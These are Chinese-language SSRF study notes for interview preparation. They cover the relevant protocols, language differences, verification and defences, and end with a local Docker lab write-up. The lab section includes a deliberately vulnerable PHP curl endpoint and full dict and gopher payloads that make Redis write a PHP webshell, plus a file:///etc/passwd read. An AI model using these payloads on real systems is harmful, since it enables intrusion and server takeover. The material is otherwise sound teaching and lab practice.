# 面向面试的SSRF学习笔记

## 书面知识

### SSRF (服务端请求伪造)原理

服务器自己设定了一个可以获取其他url资源的的功能，但是没有做好对地址或协议的过滤，导致网络边界被穿透。

示例代码：

```
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```

代码本身是用于服务器读取外网数据的，例如：`https://target.com/fetch?url=https://example.com/a.png`加载一个图片

但是如果攻击者直接向url传http://127.0.0.1:6379便能借助服务器自身访问内网资源。

<br>

<br>

### SSRF常用协议：

#### 概述

**http/https**：访问内网 Web，探测内网端口

**file**：回显条件下读本地文件，如file:///etc/passwd

**dict**：探测非http服务，例如redis    `dict://127.0.0.1:6379/info`

**gopher**：gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可以让服务器发自定义 TCP 数据。可用于反弹shell

<br>

接下来详细讲讲dict和gopher的利用

<br>

#### dict://协议

原始用途：向某个字典服务器通过TCP发送查询数据，服务器返回对应翻译内容

例如：

```bash
$ dict serendipity   //linux查询
本质上等价于执行了
dict://dict.org:2628/serendipity
```

返回

```
1 definition found
From Webster’s Revised Unabridged Dictionary (1913)
Serendipity: the faculty of making happy and unexpected discoveries //serendipity单词释义
```

<br>

ssrf实战中常用于**探测非http协议的TCP端口**，例如redis。也可以尝试rce

一些payload：

```
?url=dict://127.0.0.1:6379/info
//redis执行info，回显给客户端
```

```
?url=dict://ip:port/config:set:dbfilename:webshell.php
//修改redis备份文件名进行rce （“:”代替的是空格）
```

<br>

#### gopher://协议

> Gopher 是早期互联网中的信息检索协议，默认使用 TCP 70 端口。它的工作方式是客户端连接 Gopher 服务器后发送一个 selector，服务器根据 selector 返回菜单、文本或文件。后来在 SSRF 场景中，攻击者利用 gopher URL 中 selector 可控这一点，把 selector 编码成其他协议需要的数据，让服务端向指定 TCP 端口发送自定义内容。因此 gopher 在 SSRF 中常被用于和 Redis、Memcached、SMTP、FastCGI 或内部 HTTP 服务进行协议级交互。

<br>

它的常见格式  `gopher://ip:port/_data`   

"_"只是个占位符没有实际含义，"data" 部分可以被构造成目标协议需要的内容

<br>

1.gopher协议还能发送get或者post数据包

代码：

```
GET:
gopher://192.168.25.203:80/_GET%20/ssrf/base/get.php%3fname=Lcx%20HTTP/1.1%0d%0AHost:%20192.168.25.203%0d%0A

POST:
gopher://192.168.25.203:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.25.203%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:8%0d%0A%0d%0Aname=Lcx%0d%0A

```

很明显就是把http数据包的内容写到了_date部分

**用gopher协议打ssrf常常要二次url编码**，因为在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。

<br>

2.gopher打redis

```
/fetch?url=gopher://127.0.0.1:6379/_PING%0d%0a
```

<br>

<br>

### 简单说说不同语言下的ssrf的利用区别

<br>

#### php:

php很多函数都能读取url，使得ssrf在php中较为常见。比如file_get_contents($url),  curl()   fsockopen();

当然有前提条件。php配置里的

```
allow_url_fopen
```

它会影响文件函数能不能访问**远程url**，所以需要开启

<br>

#### python：

python里的ssrf利用范围较窄或者说限制较多

python大多请求库都默认只支持http/https协议，所以file，gopher，dict这类协议一般不能直接使用。

常见的pythojn请求库有requests、urllib、httpx。

其中，reuquest默认跟随重定向，攻击者可以通过重定向绕过过滤

```
比如
传：http://example.com/redirect
内容：302 Location: http://127.0.0.1:8000/admin
默认会跳转到127.0.0.1
```

<br>

#### java:

Java的SSRF利用方式比较局限。

一般场景仅可能支持http/s或者file

<br>

<br>

### ssrf的验证方式

1.外部可控地址验证：例如?url=https://your-server.com/test  若自己的服务器日志有的**来源ip为私有ip**就基本验证存在ssrf。有些请求可能是自己的浏览器发出来的，所以看ip很重要

2.dnslog/httplog

3.布尔型的话看页面变化

4.有回显直接拿个网页测就行，该绕过的绕一下

<br>

### ssrf的防御方式

1.业务白名单：只允许访问业务必须要访问的ip或者域名

2.限制协议，不用危险协议，尤其是gopher这个万金油

3.禁止重定向。注意python request库默认允许重定向

<br>

<br>

## 接下来是自己ssrf打redis的复现

靶机在kali虚拟机的docker容器，攻击机是物理机windows

### 环境搭建

```
mkdir -p ssrf-redis-lab/www
cd ssrf-redis-lab
nano docker-compose.yml
```

写入：

```
version: "3.8"

services:
  web:
    image: php:7.4-apache
    container_name: ssrf_web
    ports:
      - "8080:80"
    volumes:
      - ./www:/var/www/html
    networks:
      - labnet

  redis:
    image: redis:4.0.11
    container_name: ssrf_redis
    command: >
      redis-server
      --bind 0.0.0.0
      --protected-mode no
      --appendonly no
      --save ""
    ports:
      - "6380:6379"
    volumes:
      - ./www:/var/www/html
    networks:
      - labnet

networks:
  labnet:
    driver: bridge
```

www/index.php:

```
<?php
$url = $_GET['url'] ?? '';

if (!$url) {
    echo "Usage: /?url=http://example.com";
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_ALL);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_ALL);

$res = curl_exec($ch);
$err = curl_error($ch);

curl_close($ch);

echo $err ?: $res;
```

开启容器

访问测试

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260604230435.png)

<br>

### 然后就可以打靶机了

先试下dict协议测试redis服务是否通

payload：

```
dict://127.0.0.1:6379/ping
```

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260603191648.png)

可以看见回显了pong说明连上了redis服务

下面用gopher协议尝试getwebshell

要生成gopher payload较为复杂，这里用到gopherus这个工具https://github.com/tarunkant/Gopherus.git或者https://github.com/Esonhugh/Gopherus3

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260603195052.png)

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260603200310.png)

但是试了几下显示invalid multibulk length，问了一下ai说是payload格式不对

换了个工具：https://github.com/firebroo/sec_tools/tree/master/

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260605000512.png)

如果要传入浏览器url中，_后面的部分要再一次url编码

最终payload：

```
gopher://192.168.124.153:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2533%250d%250a%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2539%250d%250a%2573%2568%2565%256c%256c%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2531%2538%250d%250a%253c%253f%2570%2568%2570%2520%2570%2568%2570%2569%256e%2566%256f%2528%2529%253b%253f%253e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
```

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260604234202.png)

可以看到日志里前面几次都失败了，原因是容器用户不可写。

所以

```
sudo chown -R 999:999 ./www    给个权限
```

最后：

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260604235049.png)

<br>

<br>

ps：打的过程中出现的问题实在太多了，没ai帮忙真复现不出来，还是要多练qaq

参考博客https://www.cnblogs.com/CoLo/p/14214208.html
